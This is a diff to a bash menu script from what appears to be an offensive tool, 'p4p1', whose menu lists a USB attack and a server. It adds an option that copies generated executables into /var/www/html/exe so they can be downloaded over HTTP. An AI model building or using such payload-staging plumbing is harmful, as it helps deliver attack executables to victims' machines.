@@ -30,9 +30,11 @@ E_EXEMISS=41
 E_NOCHOICE=42
 E_MAKE=43
 E_NOCOMP=44
+E_NOROOT=45
 HOME_PATH=~/.p4p1-o/
 CONF_PATH=~/.p4p1-o/cfg/
 EXE_PATH=~/.p4p1-o/exe/
+WEBSERVER_PATH=/var/www/html/exe
 DESKTOP_PATH=~/Desktop
 UN_FILE=~/.p4p1-o/cfg/un.cfg
 PORT_FILE=~/.p4p1-o/cfg/port.cfg
@@ -278,6 +280,8 @@ else
 		echo "[1] USB ATTACK"
 		echo "[2] I WILL FIGURE MY ATTACK MYSELF JUST CP THE EXE TO THE DESKTOP"
 		echo "[3] EXECUTE SERVER"
+		echo "[4] MOVE EXE TO WEBSERVER (only for linux)"
+		echo "[ANY_OTHER_NUMBER] EXIT"
 		read q
 
 		if [ "$q" = "1" ]; then
@@ -340,6 +344,46 @@ else
 			cd ~/.p4p1-o/
 			./p4p1-s_V$VERSIORET
 			cd ~
+
+		elif [ "$q" = "4" ];then
+
+			if [[ $EUID -ne 0 ]]; then
+
+				echo "[!] You need to run as root for this one :s" 2>&1
+				exit $E_NOROOT
+
+			elif [[ "$OSTYPE" = "darwin"* ]]; then
+
+				echo "[!] and you also need to be on linux :s" 2>&1
+				exit $E_NOROOT
+
+			else
+
+				echo "[*] Checking existance of server..."
+				if [ ! -d "$WEBSERVER_PATH" ]; then
+					echo "[!] Server non existant do you want to install?? (yes/no)"
+					read q
+					if [ "$q" = "yes" ];then
+
+						mkdir $WEBSERVER_PATH
+						echo "[*] Created webserver path: $WEBSERVER_PATH"
+						cp $EXE_PATH* $WEBSERVER_PATH
+
+					else
+
+						exit $E_NOINSTALL
+
+					fi
+
+				else
+
+					echo "[*] Copying files to webserver"
+					cp $EXE_PATH* $WEBSERVER_PATH
+					echo "[*] go to http://localhost/exe/ here you can find the files"
+
+				fi
+
+			fi
 
 		else
 
